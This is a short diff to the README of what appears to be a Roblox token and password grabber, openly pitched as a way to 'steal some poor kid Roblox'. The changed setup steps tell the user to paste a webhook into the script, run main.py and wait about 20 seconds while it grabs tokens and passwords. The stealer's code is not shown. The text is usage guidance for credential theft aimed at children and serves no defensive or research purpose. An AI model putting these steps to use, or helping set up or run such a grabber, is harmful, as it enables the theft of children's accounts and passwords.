@@ -19,7 +19,8 @@ Try To Steal some poor kid Roblox ⚔️
 
 1. Put ur webhook at hook = "Line 26"
 2. and run main.py
-3. Do not close it to quick wait about 20 secs to grab all tokens/passwords and do not delete anything in the code it will buy whole grabber
+3. Do not close it to quick wait about 20 secs to grab all tokens/passwords
+4. Do not delete anything in the code it will bug whole grabber
 
 <a id="features"></a>
 
